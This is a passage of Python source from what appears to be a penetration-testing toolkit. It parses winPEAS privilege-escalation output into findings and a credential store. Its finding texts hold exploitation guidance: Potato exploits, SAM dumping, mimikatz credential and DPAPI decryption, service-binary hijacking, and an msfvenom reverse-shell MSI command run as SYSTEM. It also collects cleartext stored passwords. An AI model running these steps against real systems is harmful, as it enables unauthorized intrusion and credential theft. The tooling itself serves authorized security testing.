# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — winPEAS output parser.

Consumes the ANSI-stripped text produced by winPEAS.bat / winPEASany.exe
and extracts actionable findings / credentials into HAWK's Target Intel
and Credential Store.

Design notes
------------
* winPEAS output is NOT formally structured — it's an ever-evolving
  bash-script-for-windows that emits human-readable sections separated
  by box-drawing characters (╔══╣ SectionName).  Versions drift, so the
  parser prefers loose pattern matching over strict section parsing.
* Every finding pushed through here goes via
  `app.target_intel.add_auto_finding()` which already handles the blink
  animation, de-duplication, and "NEW/UPDATED" badges.  We only have to
  pick the right title/severity/source.
* All findings/creds pushed during a single parse share the same
  `linked_run_id` so the UI can cross-navigate between Intel ↔ Creds.
* A final "summary" finding is always added, regardless of how many
  individual findings were produced, so the user can see the parse
  happened and roughly what was found.
* Output of parse_winpeas() side-effects: writes a structured .txt
  alongside the .out, pushes findings/creds, returns a stats dict.
"""

from __future__ import annotations

import os
import re
import uuid
from datetime import datetime
from typing import Optional

from utils.config import contained_sibling


# ─── Known dangerous privileges (token_privs section) ────────────────
# Keyed on the privilege name as it appears in `whoami /priv` output,
# which winPEAS echoes verbatim in its "Current Token privileges" dump.
# Severity is HIGH for anything that gives a straight path to SYSTEM
# and MED for privileges that need further work (e.g. SeBackup lets you
# read SAM but you still need to offline-crack hashes).
_DANGEROUS_PRIVS = {
    "SeImpersonatePrivilege": (
        "high",
        "Potato-family exploits (JuicyPotato / RoguePotato / "
        "GodPotato) → SYSTEM shell.  Use the HAWK Potato picker."),
    "SeAssignPrimaryTokenPrivilege": (
        "high",
        "Potato-family exploits → SYSTEM shell (alternative trigger "
        "to SeImpersonate)."),
    "SeBackupPrivilege": (
        "medium",
        "Copy SAM + SYSTEM hives → offline hash extraction "
        "(reg save hklm\\sam sam.hiv, then secretsdump)."),
    "SeRestorePrivilege": (
        "medium",
        "Write to any file/key on disk → bypass file ACLs for "
        "persistence."),
    "SeDebugPrivilege": (
        "high",
        "Inject into any process → token steal from SYSTEM process "
        "(mimikatz / Invoke-TokenManipulation)."),
    "SeTakeOwnershipPrivilege": (
        "medium",
        "Take ownership of any object → chain with SeRestore for "
        "full control."),
    "SeLoadDriverPrivilege": (
        "high",
        "Load a signed driver → kernel-level RCE (Capcom.sys / "
        "PPLKiller style)."),
    "SeTcbPrivilege": (
        "high",
        "Act as part of the OS — essentially SYSTEM equivalent."),
    "SeCreateTokenPrivilege": (
        "high",
        "Forge tokens directly → impersonate SYSTEM."),
    "SeManageVolumePrivilege": (
        "medium",
        "Full disk access via volume management → can read any "
        "file on disk."),
}


# ─── Env var names that usually leak secrets ─────────────────────────
# Matched case-insensitively against the LHS of `NAME=VALUE` lines in
# the Environment Variables section.  Values are masked (only length
# is shown) to avoid leaking secrets into the Target Intel panel in
# clear when taking screenshots for reports.
_SECRET_ENV_RE = re.compile(
    r"(?i)(pass|pwd|secret|token|key|api[_-]?key|auth|credential|"
    r"session|cookie|private[_-]?key|access[_-]?key|bearer)")


# ─── ANSI codes (if caller forgot to strip) ──────────────────────────
_ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


# ═════════════════════════════════════════════════════════════════════
#  Public entry point
# ═════════════════════════════════════════════════════════════════════

def parse_winpeas(text: str,
                  app,
                  target: str,
                  source_file: Optional[str] = None) -> dict:
    """Parse the ANSI-stripped winPEAS text output.

    Parameters
    ----------
    text : str
        Full winPEAS output.  Should already be ANSI-stripped — we
        defensively strip again in case the caller forgot.
    app : HawkApp
        The running HAWK application; we push findings to
        `app.target_intel` and creds to `app.cred_store`.
    target : str
        Target IP/host for labelling findings.
    source_file : str, optional
        Absolute path to the original `.out` file.  If given, we also
        write a structured `.txt` sibling.

    Returns
    -------
    dict
        {"sections": {...}, "findings": [...], "creds": [...],
         "severity_counts": {"critical": N, ...}}
    """
    # Defensive double-strip — cheap, and protects against callers that
    # forget to pass clean text.
    text = _ANSI_RE.sub("", text)

    run_id = _new_run_id()
    sections = _split_into_sections(text)

    # Collect findings in-memory first so we can build the structured
    # .txt with a proper table of contents before pushing anything to
    # the UI.
    findings: list[dict] = []
    creds:    list[dict] = []

    # Each _parse_* helper appends to findings/creds and returns a
    # short "section report" dict with {name, line_start, body}.
    # Order matters — the parsed sections list in the .txt preserves
    # the order, which mirrors winPEAS' own flow so the user reads
    # from top (system) to bottom (apps).
    section_reports = []
    section_reports.append(_parse_system_info(sections, target, findings))
    section_reports.append(_parse_token_privs(sections, target, findings))
    section_reports.append(_parse_always_install_elevated(
        sections, target, findings))
    section_reports.append(_parse_autologon(
        sections, target, findings, creds))
    section_reports.append(_parse_stored_creds(
        sections, target, findings, creds))
    section_reports.append(_parse_putty_sessions(
        sections, target, findings, creds))
    section_reports.append(_parse_unquoted_services(
        sections, target, findings))
    section_reports.append(_parse_modifiable_services(
        sections, target, findings))
    section_reports.append(_parse_scheduled_tasks(
        sections, target, findings))
    section_reports.append(_parse_env_vars(sections, target, findings))
    section_reports.append(_parse_dpapi(sections, target, findings))
    section_reports.append(_parse_wifi(
        sections, target, findings, creds))
    section_reports.append(_parse_installed_apps(
        sections, target, findings))

    # Drop empty section reports (helpers return None if nothing found).
    section_reports = [s for s in section_reports if s]

    # No recognised section header anywhere means the splitter put the
    # WHOLE output into `_preamble`, every one of the 13 section
    # parsers looked up a section that does not exist and returned
    # None, and the summary below would have reported a clean parse of
    # nothing.  That happens whenever the box-drawing characters are
    # lost — a mangled code page, a copy-paste through a terminal that
    # stripped them, `winpeas.bat` output piped through `find`/`more`.
    # Say so instead of reporting silence as success.
    unparsed = (list(sections.keys()) == ["_preamble"]
                and bool(text.strip()))
    if unparsed:
        findings.append({
            "title": f"winPEAS output not parsed — no section headers "
                     f"({target})",
            "description": (
                "HAWK found no winPEAS section headers (the "
                "`╔══════════╣ <name>` lines) in this output, so none "
                "of the section parsers ran and NOTHING below was "
                "checked — this is not a clean result.\n\n"
                "Usual causes:\n"
                "  • the box-drawing characters were lost in transit "
                "(wrong code page, copy-paste through a terminal that "
                "stripped them, output piped through more/find)\n"
                "  • only a fragment of the run was captured\n\n"
                "Fix: re-run winPEAS with output redirected to a file "
                "on the target (`winPEASx64.exe > peas.txt`), transfer "
                "the file, and load THAT — do not copy from the "
                "console."),
            "severity": "medium",
            "source":   "winpeas parser",
        })

    # ── Severity tally for the summary finding ─────────────────────
    sev_counts = {"critical": 0, "high": 0, "medium": 0,
                  "low": 0, "info": 0}
    for f in findings:
        sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1

    # ── Structured .txt write ───────────────────────────────────────
    if source_file:
        try:
            _write_structured_txt(
                source_file, text, section_reports,
                findings, creds, sev_counts, target)
        except Exception as e:
            _term_warn(app,
                        f"  [!] Could not write structured .txt: {e}")

    # ── Push everything to the UI ───────────────────────────────────
    for f in findings:
        _push_finding(app, f, run_id)
    for c in creds:
        _push_credential(app, c, run_id)

    # ── Summary finding (always last so it appears fresh on top) ───
    summary_title = f"winPEAS parsed — {target}"
    summary_desc_lines = [
        f"Parser run: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
        f"Severity tally:",
        f"  • CRITICAL : {sev_counts['critical']}",
        f"  • HIGH     : {sev_counts['high']}",
        f"  • MEDIUM   : {sev_counts['medium']}",
        f"  • LOW      : {sev_counts['low']}",
        f"  • INFO     : {sev_counts['info']}",
        "",
        f"Credentials extracted: {len(creds)}",
        f"Sections processed:    {len(section_reports)}",
    ]
    if source_file:
        txt_sibling = contained_sibling(source_file, ".txt")
        summary_desc_lines.append("")
        summary_desc_lines.append(f"Readable copy: {txt_sibling}")

    # Pick summary severity as the worst individual finding (so the
    # summary's colour in the UI matches the real danger level).
    if sev_counts["critical"]:
        summary_sev = "critical"
    elif sev_counts["high"]:
        summary_sev = "high"
    elif sev_counts["medium"]:
        summary_sev = "medium"
    else:
        summary_sev = "info"

    try:
        app.target_intel.add_auto_finding(
            title=summary_title,
            description="\n".join(summary_desc_lines),
            severity=summary_sev,
            source="winpeas parser",
            linked_run_id=run_id)
    except Exception:
        pass

    return {
        "sections":        section_reports,
        "findings":        findings,
        "creds":           creds,
        "severity_counts": sev_counts,
        "run_id":          run_id,
    }


# ═════════════════════════════════════════════════════════════════════
#  Section splitter — turns the big blob into a dict-of-chunks
# ═════════════════════════════════════════════════════════════════════

# winPEAS uses a handful of section-header patterns.  We recognise:
#   ╔══════════╣ Section Name               ← main sections (UTF-8, .exe / modern .bat)
#    ╚════╣ Subsection                      ← sub (ignored as separator)
#   [+] Some check name                     ← inline "check" banners
#
# When winpeas.bat runs inside cmd.exe with the default OEM code page
# (CP850), the Unicode box chars are stored as their CP850 byte values
# and then read as Latin-1 / mangled.  Their CP850 equivalents are:
#   ╔ (U+2554) → É (0xC9)    ╠ (U+2560) → È (0xC8)
#   ═ (U+2550) → Í (0xCD)    ╣ (U+2563) → ¹ (0xB9)
# We accept both forms so the parser works regardless of code page.
_SECTION_HEADER_RE = re.compile(
    r"^\s*[╔╠ÉÈ][═─ÍÌ]{2,}[╣═─¹].*$")

# Extractor: find the section title after the last box-or-CP850 char.
_SECTION_TITLE_RE = re.compile(
    r"[╣═─¹Í]\s*([^╣═─¹]+?)\s*$")


def _split_into_sections(text: str) -> dict[str, str]:
    """Return {section_title_lower: body_text} for all top-level
    sections found.  Titles are lowercased + whitespace-compressed for
    robust lookup regardless of exact winPEAS casing.

    Handles both UTF-8 (normal) and CP850-read-as-Latin-1 box chars so
    the parser works whether winpeas.bat ran under chcp 65001 (UTF-8)
    or the default Windows OEM code page (CP850).
    """
    lines = text.splitlines()
    sections: dict[str, list[str]] = {"_preamble": []}
    current = "_preamble"

    for line in lines:
        if _SECTION_HEADER_RE.match(line):
            m = _SECTION_TITLE_RE.search(line)
            if m:
                title = _normalise(m.group(1))
                if title:
                    current = title
                    sections.setdefault(current, [])
                    continue
        sections.setdefault(current, []).append(line)

    return {k: "\n".join(v) for k, v in sections.items()}


def _normalise(s: str) -> str:
    return re.sub(r"\s+", " ", s.strip().lower())


def _find_section(sections: dict[str, str],
                  *keywords: str) -> Optional[str]:
    """Return the body of the first section whose title contains ALL
    of the given keywords (AND match), or None.  Keywords are matched
    case-insensitively against the normalised title."""
    kws = [k.lower() for k in keywords]
    for title, body in sections.items():
        if all(k in title for k in kws):
            return body
    return None


# ═════════════════════════════════════════════════════════════════════
#  Individual section parsers
# ═════════════════════════════════════════════════════════════════════
#
# Convention for every _parse_* helper:
#   * Returns None when the section was not present in the output
#     (don't clutter the TOC with empty sections).
#   * Otherwise returns a dict {name, body} used to build the
#     structured .txt table of contents.
#   * Mutates findings/creds lists in place; never touches the app
#     directly (that's the orchestrator's job).

def _parse_system_info(sections, target, findings):
    """OS, version, patch level — info-only, with a hint to cross-check
    with the user's own OS fingerprint.  Never critical."""
    body = (_find_section(sections, "basic", "system")
            or _find_section(sections, "system", "information"))
    if not body:
        return None

    # Scrape 'systeminfo' output.  winPEAS includes the full thing.
    os_name = _scrape(body, r"OS Name[:\s]+(.+)")
    os_ver  = _scrape(body, r"OS Version[:\s]+(.+)")
    host    = _scrape(body, r"Host Name[:\s]+(.+)")
    domain  = _scrape(body, r"Domain[:\s]+(.+)")

    # Hotfixes: winPEAS dumps `wmic qfe list` — count them.
    hotfix_count = len(re.findall(r"KB\d{6,}", body))

    desc_lines = []
    if host:    desc_lines.append(f"Host name    : {host}")
    if os_name: desc_lines.append(f"OS           : {os_name}")
    if os_ver:  desc_lines.append(f"Version      : {os_ver}")
    if domain:  desc_lines.append(f"Domain       : {domain}")
    desc_lines.append(f"Hotfixes     : {hotfix_count}")
    desc_lines.append("")
    desc_lines.append(
        "Hint: this result is safe — cross-check with your OS "
        "fingerprint if you want.")

    findings.append({
        "title":       f"winPEAS — system info ({host or target})",
        "description": "\n".join(desc_lines),
        "severity":    "info",
        "source":      "winpeas parser",
    })
    return {"name": "System Information", "body": body}


def _priv_state(line: str) -> str:
    """'enabled' / 'disabled' / '' for one privilege line.

    Handles both `whoami /priv`'s State column and winPEAS.exe's
    SE_PRIVILEGE_* flag constants.  Only SE_PRIVILEGE_ENABLED counts as
    enabled: SE_PRIVILEGE_ENABLED_BY_DEFAULT on its own describes the
    token's default, not its current state.
    """
    s = (line or "").upper()
    s_wo_default = s.replace("SE_PRIVILEGE_ENABLED_BY_DEFAULT", "")
    if "SE_PRIVILEGE_ENABLED" in s_wo_default:
        return "enabled"
    if "SE_PRIVILEGE_REMOVED" in s or re.search(r"\bDISABLED\b", s):
        return "disabled"
    if re.search(r"\bENABLED\b", s_wo_default):
        return "enabled"
    return ""


def _parse_token_privs(sections, target, findings):
    """Detect dangerous privileges in the `whoami /priv` dump."""
    body = (_find_section(sections, "token", "priv")
            or _find_section(sections, "current token")
            or _find_section(sections, "users", "information"))
    if not body:
        return None

    # Two output shapes reach this parser, and the old pattern
    #     ^<priv>\s+.*?\b(Enabled|Disabled)\b
    # only ever matched the first one:
    #
    #   `whoami /priv` table — name at column 0, state as a word:
    #     SeImpersonatePrivilege   Impersonate a client after auth   Enabled
    #
    #   winPEAS.exe's own dump — INDENTED, and the state is a flag
    #   constant whose ENABLED is glued to an underscore, so
    #   `\bEnabled\b` never matched it:
    #     SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    #
    # SeImpersonatePrivilege is the prerequisite of the entire Potato
    # chain, and it was being dropped in silence on every winPEAS.exe
    # run.
    dangerous_found = []
    for priv, (sev, hint) in _DANGEROUS_PRIVS.items():
        pat = re.compile(
            rf"^[^\S\n]*{re.escape(priv)}[^\S\n]*[:\s][^\n]*$",
            re.M | re.I)
        m = pat.search(body)
        if m and _priv_state(m.group(0)) == "enabled":
            dangerous_found.append((priv, sev, hint))

    if not dangerous_found:
        return None

    # One finding per enabled privilege — they're independent escalation
    # paths and the user may want to act on them selectively.
    for priv, sev, hint in dangerous_found:
        findings.append({
            "title":       f"Privilege enabled: {priv}",
            "description": (
                f"User has {priv} enabled on {target}.\n\n"
                f"Impact: {hint}"),
            "severity":    sev,
            "source":      "winpeas parser",
        })
    return {"name": "Token Privileges", "body": body}


def _parse_always_install_elevated(sections, target, findings):
    """Checks HKLM / HKCU AlwaysInstallElevated registry keys.
    CRITICAL when BOTH are 0x1 → any MSI runs as SYSTEM."""
    body = _find_section(sections, "alwaysinstallelevated")
    if not body:
        # winPEAS sometimes inlines this check in the System Information
        # section rather than a dedicated section.
        for s in sections.values():
            if "alwaysinstallelevated" in s.lower():
                body = s
                break
    if not body:
        return None

    # Read the value off the SAME LINE as the key name.
    #
    # `_scrape(body, r"HKLM.*?(0x[01])")` searched the whole body, and
    # in the fallback path that body is an entire unrelated winPEAS
    # section that merely mentions AlwaysInstallElevated somewhere.
    # `.*?` then walked to the first `0x1` anywhere below — a value
    # belonging to some other registry key — and the parser announced
    # the CRITICAL "any MSI runs as SYSTEM" condition off it.
    hklm = hkcu = ""
    for ln in body.splitlines():
        if "alwaysinstallelevated" not in ln.lower():
            continue
        m = re.search(r"(0x[01])\b", ln, re.I)
        if not m:
            continue
        val = m.group(1).lower()
        if re.search(r"\bHKLM\b|HKEY_LOCAL_MACHINE", ln, re.I):
            hklm = hklm or val
        elif re.search(r"\bHKCU\b|HKEY_CURRENT_USER", ln, re.I):
            hkcu = hkcu or val
    if not (hklm or hkcu):
        return None

    both_set = hklm == "0x1" and hkcu == "0x1"
    one_set  = hklm == "0x1" or hkcu == "0x1"

    if both_set:
        findings.append({
            "title":       "AlwaysInstallElevated ENABLED (HKLM+HKCU)",
            "description": (
                f"Both AlwaysInstallElevated keys are set to 0x1 on "
                f"{target}.\nAny MSI file executed with msiexec runs "
                f"as NT AUTHORITY\\SYSTEM.\n\n"
                f"Exploit:\n"
                f"  msfvenom -p windows/x64/shell_reverse_tcp "
                f"LHOST=<kali> LPORT=4444 -f msi > shell.msi\n"
                f"  msiexec /quiet /qn /i shell.msi"),
            "severity":    "critical",
            "source":      "winpeas parser",
        })
    elif one_set:
        which = "HKLM" if hklm == "0x1" else "HKCU"
        findings.append({
            "title":       f"AlwaysInstallElevated — only {which} set",
            "description": (
                f"Only {which} has AlwaysInstallElevated=0x1 on "
                f"{target}.\nNOT directly exploitable — both keys must "
                f"be 1 for the privilege elevation to trigger.  Still "
                f"worth a note in the report."),
            "severity":    "low",
            "source":      "winpeas parser",
        })
    return {"name": "AlwaysInstallElevated", "body": body}


def _parse_autologon(sections, target, findings, creds):
    """Registry AutoLogon credentials — DefaultPassword in cleartext."""
    body = _find_section(sections, "autologon")
    if not body:
        return None

    user = _scrape(body, r"DefaultUser[Nn]ame\s*[:=]\s*(.+)")
    dom  = _scrape(body, r"DefaultDomain[Nn]ame\s*[:=]\s*(.+)")
    pw   = _scrape(body, r"DefaultPassword\s*[:=]\s*(.+)")
    # Alternative password key in some Windows versions
    if not pw:
        pw = _scrape(body, r"AltDefaultPassword\s*[:=]\s*(.+)")

    if not (user and pw):
        return None

    full_user = f"{dom}\\{user}" if dom and dom != "." else user

    findings.append({
        "title":       f"AutoLogon credential: {full_user}",
        "description": (
            f"AutoLogon configured on {target} with stored "
            f"DefaultPassword in the registry.\n"
            f"Username: {full_user}\n"
            f"Password: (pushed to Credential Store)\n\n"
            f"Path: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\"
            f"CurrentVersion\\Winlogon"),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    creds.append({
        "username":  full_user,
        "password":  pw,
        "host":      target,
        "services":  ["WinRM", "SMB", "RDP"],
        "cred_type": "cleartext",
        "notes":     "AutoLogon registry (winPEAS)",
    })
    return {"name": "AutoLogon Credentials", "body": body}


def _parse_stored_creds(sections, target, findings, creds):
    """`cmdkey /list` — stored Credential Manager entries.  We can't
    recover the password (Windows DPAPI-encrypts them) but the target
    + username is useful intel for later runas/Mimikatz."""
    body = (_find_section(sections, "cmdkey")
            or _find_section(sections, "stored", "credential")
            or _find_section(sections, "saved", "credential"))
    if not body:
        return None

    # Entries look like:
    #   Target: Domain:target=10.10.10.5
    #   Type: Domain Password
    #   User: DOMAIN\admin
    entries = re.findall(
        r"Target:\s*(\S+).*?User:\s*(\S+)",
        body, re.S | re.I)
    if not entries:
        return None

    lines = []
    for tgt, usr in entries[:20]:
        lines.append(f"  • {usr}  →  {tgt}")
        creds.append({
            "username":  usr,
            "password":  "",
            "host":      target,
            "services":  ["Credential Manager"],
            "cred_type": "cleartext",  # placeholder; DPAPI-encrypted
            "notes":     (f"cmdkey target: {tgt} — decrypt with "
                          f"mimikatz (vault::cred)"),
        })

    findings.append({
        "title":       f"Credential Manager entries ({len(entries)})",
        "description": (
            f"winPEAS enumerated {len(entries)} entries in the "
            f"Windows Credential Manager on {target}.\n"
            f"Passwords are DPAPI-encrypted — use mimikatz "
            f"`vault::cred /patch` to decrypt.\n\n"
            + "\n".join(lines)),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    return {"name": "Stored Credentials (cmdkey)", "body": body}


def _parse_putty_sessions(sections, target, findings, creds):
    """PuTTY saved sessions — hostnames + usernames leak even if the
    password isn't stored (PuTTY doesn't store passwords by default)."""
    body = (_find_section(sections, "putty")
            or _find_section(sections, "putty", "sessions"))
    if not body:
        return None

    sessions = re.findall(
        r"Session:\s*(.+?)\s*HostName:\s*(.+?)\s*"
        r"(?:UserName:\s*(.+?))?(?:\n|$)",
        body, re.I)
    if not sessions:
        return None

    lines = []
    for sess_name, host, user in sessions[:30]:
        user = user or "(unknown)"
        lines.append(f"  • {sess_name}  →  {user}@{host}")
        if user and user != "(unknown)":
            creds.append({
                "username":  user,
                "password":  "",
                "host":      host,
                "services":  ["SSH"],
                "cred_type": "cleartext",
                "notes":     (f"PuTTY session on {target} — session "
                              f"name: {sess_name}"),
            })

    findings.append({
        "title":       f"PuTTY saved sessions ({len(sessions)})",
        "description": (
            f"winPEAS found {len(sessions)} PuTTY saved session(s) on "
            f"{target}.\nHost/user pairs leak intel about the "
            f"network even without stored passwords.\n\n"
            + "\n".join(lines)),
        "severity":    "medium",
        "source":      "winpeas parser",
    })
    return {"name": "PuTTY Sessions", "body": body}


def _parse_unquoted_services(sections, target, findings):
    """Unquoted service paths — if any directory along the path is
    writable by the current user, a same-named exe gets executed as
    the service's account (often SYSTEM)."""
    body = (_find_section(sections, "unquoted")
            or _find_section(sections, "services", "information"))
    if not body:
        return None

    # Match the typical line
    #   "  ServiceName  C:\Program Files\App\svc.exe"
    # inside the unquoted subsection.  We only care about paths that
    # contain at least one space AND no surrounding quotes.
    unquoted = []
    for line in body.splitlines():
        m = re.search(
            r'\s([A-Za-z][A-Za-z0-9_\-\.]+)\s+(C:\\[^"\n]*?\s[^"\n]+\.[Ee][Xx][Ee])',
            line)
        if m:
            svc, path = m.group(1), m.group(2).strip()
            # Skip if already quoted (regex shouldn't match but belt+suspenders)
            if '"' not in path:
                unquoted.append((svc, path))

    if not unquoted:
        return None

    lines = [f"  • {svc}  →  {path}" for svc, path in unquoted[:20]]
    findings.append({
        "title":       f"Unquoted service paths ({len(unquoted)})",
        "description": (
            f"Unquoted service paths detected on {target}.\n"
            f"If any intermediate directory is writable by your user, "
            f"drop a binary named like the next token (e.g. "
            f"'Program.exe' for 'C:\\Program Files\\...') and "
            f"restart the service to get RCE as the service account "
            f"(often SYSTEM).\n\n"
            f"Verify writability: `icacls <dir>` for each parent.\n\n"
            + "\n".join(lines)),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    return {"name": "Unquoted Service Paths", "body": body}


def _parse_modifiable_services(sections, target, findings):
    """Services whose binary or config is writable by current user →
    straight RCE as service account."""
    body = (_find_section(sections, "modifiable", "service")
            or _find_section(sections, "interesting", "services"))
    if not body:
        return None

    # winPEAS reports services in the format
    #   [!] Service: XYZ — path C:\...\svc.exe — modifiable!
    matches = re.findall(
        r"(?:\*|\-|\[!\])\s*(\S+?)\s*[(\[]?"
        r"(?:path|binary)[:=]?\s*([^)\]\n]+)",
        body, re.I)
    if not matches:
        return None

    lines = [f"  • {name}  →  {path.strip()}" for name, path in matches[:20]]
    findings.append({
        "title":       f"Modifiable services ({len(matches)})",
        "description": (
            f"winPEAS found services on {target} whose binary or "
            f"registry config can be modified by the current user.\n"
            f"Replace the binary (or the ImagePath registry value) "
            f"with your payload and restart the service → RCE as the "
            f"service account.\n\n"
            + "\n".join(lines)),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    return {"name": "Modifiable Services", "body": body}


_SCHTASKS_FIELD_RE = re.compile(r"^\s*([A-Za-z][A-Za-z /]*?)\s*:\s*(.*)$")


def _schtasks_records(body: str) -> list:
    """Split `schtasks /query /fo LIST /v` output into per-task dicts.

    Replaces a three-hop DOTALL regex
        TaskName…\\n.*?Run As User…\\n.*?Task To Run…
    which was wrong twice over:

    * schtasks prints `Task To Run` BEFORE `Run As User`, so the third
      hop skipped past the end of the current record and picked up the
      NEXT task's binary.  Every task was reported with someone else's
      executable and roughly half were lost.
    * three nested lazy `.*?` over the whole section backtrack
      cubically.  On a real host's task list (hundreds of records) a
      near-miss could pin the GUI thread for minutes.

    A field-per-line walk is linear and does not care about ordering.
    """
    records, cur = [], {}
    for line in body.splitlines():
        m = _SCHTASKS_FIELD_RE.match(line)
        if not m:
            continue
        key = re.sub(r"\s+", " ", m.group(1)).strip().lower()
        val = m.group(2).strip()
        # A second TaskName/HostName opens the next record.
        if key in ("taskname", "hostname") and cur.get("taskname"):
            records.append(cur)
            cur = {}
        cur[key] = val
    if cur.get("taskname"):
        records.append(cur)
    return records


def _parse_scheduled_tasks(sections, target, findings):
    """Scheduled tasks — weak permissions on the binary/script the task
    runs means scheduled RCE as whoever owns the task."""
    body = _find_section(sections, "scheduled", "applications")
    if not body:
        body = _find_section(sections, "scheduled", "tasks")
    if not body:
        return None

    # Most helpful signal in winPEAS: tasks with author/user = SYSTEM
    # AND an executable path in a user-writable location.  We can't
    # assess ACLs from text alone, so we just flag tasks where the
    # "Run As User" is SYSTEM/admin and ask the user to verify.
    tasks = []
    for rec in _schtasks_records(body):
        name = rec.get("taskname", "")
        user = rec.get("run as user", "")
        action = rec.get("task to run", "")
        if name and user:
            tasks.append((name, user, action))
    if not tasks:
        return None

    system_tasks = [(n, u, a) for n, u, a in tasks
                    if re.search(r"system|admin", u, re.I)]
    if not system_tasks:
        return None

    lines = [f"  • {n.strip()}  (as {u.strip()})  →  {a.strip()}"
             for n, u, a in system_tasks[:15]]
    findings.append({
        "title":       f"Scheduled tasks as SYSTEM/admin "
                       f"({len(system_tasks)})",
        "description": (
            f"winPEAS found {len(system_tasks)} scheduled task(s) on "
            f"{target} that run as a privileged user.\nCheck "
            f"write-access to each referenced binary/script with "
            f"`icacls <path>` — if writable, you have persistent RCE "
            f"as that user.\n\n"
            + "\n".join(lines)),
        "severity":    "medium",
        "source":      "winpeas parser",
    })
    return {"name": "Scheduled Tasks", "body": body}


def _parse_env_vars(sections, target, findings):
    """Environment variables — flag anything whose NAME looks like a
    secret (pass, token, key, ...).  Value is masked in the finding to
    avoid screenshot leaks; the raw value is in the .txt sibling."""
    body = _find_section(sections, "environment", "variables")
    if not body:
        body = _find_section(sections, "environment")
    if not body:
        return None

    suspicious = []
    for line in body.splitlines():
        m = re.match(r"\s*([A-Za-z_][A-Za-z0-9_]+)\s*[:=]\s*(.+)", line)
        if not m:
            continue
        name, value = m.group(1), m.group(2).strip()
        if _SECRET_ENV_RE.search(name):
            masked = (f"<{len(value)} chars>" if value else "<empty>")
            suspicious.append((name, masked, value))

    if not suspicious:
        return None

    lines = [f"  • {n}  =  {masked}" for n, masked, _ in suspicious]
    findings.append({
        "title":       f"Env vars with secret-like names "
                       f"({len(suspicious)})",
        "description": (
            f"Environment variables on {target} whose names look "
            f"like they hold secrets.  Values are masked here — "
            f"check the .txt sibling for the raw contents.\n\n"
            + "\n".join(lines)),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    return {"name": "Environment Variables", "body": body}


def _parse_dpapi(sections, target, findings):
    """DPAPI master keys — decrypting these unlocks Chrome passwords,
    Wi-Fi PSKs, Credential Manager entries.  Just flag presence; the
    user decrypts offline with mimikatz."""
    body = (_find_section(sections, "dpapi")
            or _find_section(sections, "master", "keys"))
    if not body:
        return None

    key_paths = re.findall(
        r"[A-Za-z]:\\.*?(?:Microsoft\\Protect|Crypto\\RSA)\\[^\s\n]+",
        body)
    if not key_paths:
        return None

    lines = [f"  • {p}" for p in key_paths[:15]]
    findings.append({
        "title":       f"DPAPI master keys found ({len(key_paths)})",
        "description": (
            f"winPEAS located {len(key_paths)} DPAPI master key(s) on "
            f"{target}.\n"
            f"Hint: consider using `mimikatz dpapi::masterkey /in:<path> "
            f"/sid:<S-1-5-...> /password:<userpass>` to decrypt, then "
            f"use the resulting masterkey to crack Chrome / "
            f"Credential Manager / Wi-Fi passwords.\n\n"
            + "\n".join(lines)),
        "severity":    "info",
        "source":      "winpeas parser",
    })
    return {"name": "DPAPI Master Keys", "body": body}


# `netsh wlan show profile <name> key=clear` prints
#     SSID name              : "HomeNet"
#     Key Content            : Sup3rWiFi!2026
# winPEAS.exe condenses it to `SSID: …` / `Password: …`.
_WIFI_SSID_RE = re.compile(
    r"^\s*SSID(?:\s+name)?\s*[:=]\s*(.+?)\s*$", re.I)
_WIFI_NAME_RE = re.compile(r"^\s*Name\s*[:=]\s*(.+?)\s*$", re.I)
_WIFI_KEY_RE = re.compile(
    r"^\s*(?:Key\s+Content|Password|PSK)\s*[:=]\s*(.*?)\s*$", re.I)


def _parse_wifi(sections, target, findings, creds):
    """Wi-Fi profiles with cleartext keys (`netsh wlan show profile
    key=clear`)."""
    body = _find_section(sections, "wifi")
    if not body:
        body = _find_section(sections, "wlan")
    if not body:
        return None

    # Walk the profile block line by line and pair each key with the
    # SSID above it.
    #
    # The old pattern was
    #     SSID[:\s]+(.+?)\s*\n.*?(?:Key Content|Password)[:\s]+(.+)
    # with DOTALL, which broke three ways at once on real
    # `netsh wlan show profile … key=clear` output:
    #   • `SSID[:\s]+` matched the SSID NAME label, so the captured
    #     "SSID" was `name              : "HomeNet"`;
    #   • the trailing `(.+)` under DOTALL swallowed THE REST OF THE
    #     SECTION as the PSK — that string went into the Credential
    #     Store as a Wi-Fi password;
    #   • the greedy tail left nothing for findall to iterate, so only
    #     the first profile was ever reported.
    profiles = []
    current_ssid = ""
    fallback_name = ""
    for line in body.splitlines():
        m = _WIFI_SSID_RE.match(line)
        if m:
            current_ssid = m.group(1).strip().strip('"')
            continue
        m = _WIFI_NAME_RE.match(line)
        if m:
            fallback_name = m.group(1).strip().strip('"')
            continue
        m = _WIFI_KEY_RE.match(line)
        if not m:
            continue
        key = m.group(1).strip()
        # `Security key : Present` is a presence flag, not a key; the
        # key regex already excludes it, but netsh also prints
        # "Absent"/"N/A" in the Key Content slot on open networks.
        if not key or key.lower() in ("present", "absent", "n/a", "none"):
            continue
        ssid = current_ssid or fallback_name
        if not ssid:
            continue
        profiles.append((ssid, key))
        current_ssid = ""
    if not profiles:
        return None

    lines = []
    for ssid, key in profiles[:20]:
        ssid, key = ssid.strip(), key.strip()
        lines.append(f"  • {ssid}  →  {key}")
        creds.append({
            "username":  ssid,
            "password":  key,
            "host":      target,
            "services":  ["WiFi"],
            "cred_type": "cleartext",
            "notes":     f"Wi-Fi PSK on {target}",
        })

    findings.append({
        "title":       f"Wi-Fi cleartext keys ({len(profiles)})",
